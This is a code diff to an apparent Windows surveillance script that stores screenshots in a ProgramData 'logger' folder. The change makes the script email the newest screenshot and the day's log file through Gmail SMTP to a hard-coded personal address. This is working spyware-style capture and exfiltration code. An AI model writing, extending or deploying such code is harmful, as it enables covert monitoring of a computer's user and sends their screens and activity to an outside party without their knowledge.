@@ -4,6 +4,7 @@ import pyautogui
 import email, smtplib, ssl
 import os
 import win32com.client
+import glob
 
 from email import encoders
 from email.mime.base import MIMEBase
@@ -126,8 +127,8 @@ while True:
         password = open("../.env").readlines()[0]
         sender_email = "codyschaefer22@gmail.com"
         recvr_email = "codyschaefer22@gmail.com"
-        subject = "Python email"
-        body = "This is me testing something"
+        subject = f'{date_str}_{curr_time.strftime("%H-%M-%S")} Update'
+        body = ""
 
         message = MIMEMultipart()
         message["From"] = sender_email
@@ -136,20 +137,39 @@ while True:
 
         message.attach(MIMEText(body, "plain"))
 
-        filename = "C:/ProgramData/logger/screenshots/03-05-2023_00-16-57.jpg"
+        # Get the most recent screenshot file
+        ss_files_list = glob.glob("C:/ProgramData/logger/screenshots/*")
+        ss_filename_latest = max(ss_files_list, key=os.path.getctime)
 
-        with open(filename, "rb") as attachment:
+        # Open and encode the attachment so it can be added to the email
+        with open(ss_filename_latest, "rb") as attachment:
             part = MIMEBase("application", "octet-stream")
             part.set_payload(attachment.read())
-        
         encoders.encode_base64(part)
 
         part.add_header(
             "Content-Disposition",
-            f"attachment; filename= {filename}",
+            f"attachment; filename= {ss_filename_latest}",
         )
 
+        # Attach the screenshot
         message.attach(part)
+
+        # Add the log for the day to the email
+        logs_path = win_create_folder()
+        with open(f'{logs_path}/logs/{date_str}.log', 'r') as log:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(log.read())
+        encoders.encode_base64(part)
+
+        part.add_header(
+            "Content-Disposition",
+            f"attachment; filename= {date_str}.log",
+        )
+
+        # Attach the log
+        message.attach(part)
+
         text = message.as_string()
 
         context = ssl.create_default_context()
